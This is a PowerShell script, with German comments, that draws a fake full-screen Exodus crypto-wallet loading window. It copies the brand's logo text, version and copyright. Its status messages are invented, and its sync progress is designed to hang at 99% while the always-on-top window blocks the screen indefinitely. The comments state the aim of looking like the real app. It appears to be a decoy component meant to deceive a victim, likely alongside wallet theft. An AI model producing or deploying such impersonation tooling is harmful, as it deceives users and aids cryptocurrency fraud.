Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Vollbild ohne Rahmen – sieht aus wie echte App
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus"
$form.WindowState = "Maximized"
$form.FormBorderStyle = "None"          # Kein Rahmen, keine Taskleiste verschwindet fast
$form.TopMost = $true
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.BackColor = [System.Drawing.Color]::FromArgb(18,18,26)  # Original Exodus Dark
$form.ForeColor = "White"

# ==================== EXODUS LOADING GIF ====================
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.SizeMode = "Zoom"
$pictureBox.Dock = "Top"
$pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2


if ($false) {
} else {
    # Fallback: groÃŸes Exodus-Text-Logo
    $logoLabel = New-Object System.Windows.Forms.Label
    $logoLabel.Text = "EXODUS"
    $logoLabel.Font = New-Object System.Drawing.Font("Arial Black", 72, [System.Drawing.FontStyle]::Bold)
    $logoLabel.ForeColor = "#8B5CF6"
    $logoLabel.Dock = "Top"
    $logoLabel.TextAlign = "MiddleCenter"
    $logoLabel.Height = 300
    $form.Controls.Add($logoLabel)
}
$form.Controls.Add($pictureBox)

# Loading-Text mit Punkten
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Text = "Loading wallet"
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 28, [System.Drawing.FontStyle]::Regular)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$form.Controls.Add($loadingLabel)

# Haupt-Status
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Top"
$statusLabel.Height = 60
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.Text = "Initializing..."
$form.Controls.Add($statusLabel)

# Blockchain Sync Prozent (hÃ¤ngt spÃ¤ter bei 99.x %)
$syncLabel = New-Object System.Windows.Forms.Label
$syncLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16)
$syncLabel.ForeColor = "#AAAAAA"
$syncLabel.Dock = "Top"
$syncLabel.Height = 50
$syncLabel.TextAlign = "MiddleCenter"
$syncLabel.Text = "Syncing blockchain... 0%"
$form.Controls.Add($syncLabel)

# ProgressBar 1 – Blockchain Sync (langsam hoch, bleibt bei 99.x stecken)
$progressSync = New-Object System.Windows.Forms.ProgressBar
$progressSync.Style = "Continuous"
$progressSync.ForeColor = "#8B5CF6"
$progressSync.Dock = "Top"
$progressSync.Height = 10
$progressSync.Margin = New-Object System.Windows.Forms.Padding(80,20,80,20)
$form.Controls.Add($progressSync)

# ProgressBar 2 – Marquee wie bei Ledger/Exodus
$progressMarquee = New-Object System.Windows.Forms.ProgressBar
$progressMarquee.Style = "Marquee"
$progressMarquee.MarqueeAnimationSpeed = 30
$progressMarquee.Dock = "Top"
$progressMarquee.Height = 6
$progressMarquee.Margin = New-Object System.Windows.Forms.Padding(120,30,120,40)
$form.Controls.Add($progressMarquee)

# Version & Copyright unten
$footer = New-Object System.Windows.Forms.Label
$footer.Text = "Exodus Version 25.1.17   © 2025 Exodus Movement, Inc."
$footer.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$footer.ForeColor = "#555555"
$footer.Dock = "Bottom"
$footer.Height = 40
$footer.TextAlign = "MiddleCenter"
$form.Controls.Add($footer)

# ==================== SEHR REALISTISCHE STATUS-TEXTE ====================
$statuses = @(
    "Initializing wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Loading asset configurations...",
    "Syncing Bitcoin network...",
    "Syncing Ethereum network...",
    "Syncing Solana network...",
    "Fetching real-time prices...",
    "Verifying transaction history...",
    "Establishing encrypted connection...",
    "Loading portfolio assets...",
    "Preparing secure environment...",
    "Finalizing wallet data...",
    "Almost there..."
)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3500   # Langsamer Wechsel = echter
$dotCount = 0
$statusIndex = 0
$percent = 0

$timer.Add_Tick({
    # Punkte Animation
    $dotCount = ($dotCount + 1) % 4
    $dots = "." * $dotCount
    $loadingLabel.Text = "Loading wallet$dots"

    # Status wechseln (manchmal lÃ¤nger auf einem stehen bleiben)
    if ((Get-Random -Minimum 1 -Maximum 10) -gt 5) {
        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]
    }

    # Prozent hochzÃ¤hlen – extrem realistisch (langsam, bleibt bei 99.x hÃ¤ngen)
    if ($percent -lt 99) {
        $percent += Get-Random -Minimum 1 -Maximum 4
        if ($percent -gt 99) { $percent = 99 }
        $syncLabel.Text = "Syncing blockchain... $percent%"
        $progressSync.Value = $percent
    } elseif ($percent -eq 99) {
        # Bei 99% zufÃ¤llig kleine SprÃ¼nge 99.1 – 99.8%, dann wieder runter oder stehen bleiben
        if ((Get-Random -Minimum 1 -Maximum 20) -eq 1) {
            $sub = Get-Random -Minimum 1 -Maximum 8
            $syncLabel.Text = "Syncing blockchain... 99.$sub%"
        }
    }
})

$timer.Start()

# Blockiert alles – lÃ¤uft ewig oder bis Task-Manager

$form.ShowDialog() | Out-Null


